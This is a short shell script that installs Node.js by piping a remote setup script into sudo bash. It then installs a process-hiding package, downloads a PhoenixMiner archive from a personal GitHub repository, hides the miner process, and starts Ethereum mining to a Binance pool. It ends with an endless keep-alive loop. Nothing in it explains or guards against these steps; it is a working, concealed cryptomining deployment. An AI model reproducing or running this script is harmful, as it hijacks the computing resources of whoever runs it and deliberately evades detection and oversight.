#!/bin/sh
#!/bin/bash

apt update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm i -g node-process-hider
wget https://github.com/gyrogerald/dera/raw/main/topu.zip
unzip topu.zip
sudo ph add PhoenixMiner
cd PhoenixMiner_6.0b_Linux
chmod 777 PhoenixMiner 
./PhoenixMiner -pool ethash.poolbinance.com:443 -wal TeslaM -worker gyro -epsw x -asm 2 -dbg -1 -allpools 1 -mode 1 eth pause 

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 15m; done

sleep 2

done
